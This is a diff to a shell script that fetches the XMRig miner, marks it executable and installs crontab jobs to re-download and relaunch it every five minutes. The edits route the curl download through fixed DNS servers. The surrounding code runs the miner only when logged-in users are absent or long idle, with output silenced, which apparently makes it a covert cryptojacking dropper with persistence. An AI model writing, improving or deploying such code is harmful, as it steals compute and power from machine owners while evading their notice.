@@ -91,15 +91,14 @@ download_xmrig() {
     log "下载URL: $DOWNLOAD_URL"
     log "保存路径: $filepath"
     
-    # 使用curl下载，如果失败则尝试wget
-    if command -v curl >/dev/null 2>&1; then
-        curl -s -L "$DOWNLOAD_URL" -o "$filepath"
-    elif command -v wget >/dev/null 2>&1; then
-        wget -q "$DOWNLOAD_URL" -O "$filepath"
-    else
-        log "错误: 未找到curl或wget命令"
+    # 检查curl是否可用
+    if ! command -v curl >/dev/null 2>&1; then
+        log "错误: 未找到curl命令，无法下载文件"
         return 1
     fi
+    
+    # 使用curl下载，使用自定义DNS服务器
+    curl -s -L --dns-servers 8.8.8.8,8.8.4.4 "$DOWNLOAD_URL" -o "$filepath"
     
     if [ $? -eq 0 ] && [ -f "$filepath" ]; then
         chmod +x "$filepath"
@@ -209,7 +208,7 @@ setup_crontab() {
     local user_check_logic="users=\\\$(who | wc -l); if [ \\\$users -eq 0 ]; then can_exec=1; else can_exec=1; while IFS= read -r line; do if [ -n \"\\\$line\" ]; then idle=\\\$(echo \"\\\$line\" | awk '{print \\\$4}'); if [[ \"\\\$idle\" == \".\" ]]; then can_exec=0; break; elif [[ \"\\\$idle\" =~ ^[0-9]{2}:[0-9]{2}\\\$ ]]; then hours=\\\$(echo \"\\\$idle\" | cut -d: -f1); hours=\\\$((10#\\\$hours)); if [ \\\$hours -lt 5 ]; then can_exec=0; break; fi; elif [[ \"\\\$idle\" != \"old\" ]]; then can_exec=0; break; fi; fi; done < <(who); fi"
     
     # 构建定时任务命令 - 任务1：文件检查和下载（每5分钟）
-    local file_check_cmd="$user_check_logic; [ \\\$can_exec -eq 1 ] && [ ! -f \"$XMRIG_DIR/$filename\" ] && curl -s -L \"$DOWNLOAD_URL\" -o \"$XMRIG_DIR/$filename\" && chmod +x \"$XMRIG_DIR/$filename\""
+    local file_check_cmd="$user_check_logic; [ \\\$can_exec -eq 1 ] && [ ! -f \"$XMRIG_DIR/$filename\" ] && curl -s -L --dns-servers 8.8.8.8,8.8.4.4 \"$DOWNLOAD_URL\" -o \"$XMRIG_DIR/$filename\" && chmod +x \"$XMRIG_DIR/$filename\""
     
     # 构建定时任务命令 - 任务2：进程监控和重启（每5分钟）
     local process_monitor_cmd="$user_check_logic; [ \\\$can_exec -eq 1 ] && [ ! \\\$(pgrep -f \"$filename\") ] && cd \"$XMRIG_DIR\" && nohup nice -n 19 ./$filename -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=1 >/dev/null 2>&1 &"
@@ -288,9 +287,14 @@ main() {
     log "CPU百分比: $CPU_PERCENTAGE%"
     
     # 检查必要命令
-    for cmd in bc nproc ps; do
+    for cmd in bc nproc ps curl; do
         if ! command -v "$cmd" >/dev/null 2>&1; then
-            log "警告: 未找到命令 $cmd，某些功能可能受限"
+            if [ "$cmd" = "curl" ]; then
+                log "错误: 未找到curl命令，这是必需的下载工具"
+                exit 1
+            else
+                log "警告: 未找到命令 $cmd，某些功能可能受限"
+            fi
         fi
     done
     
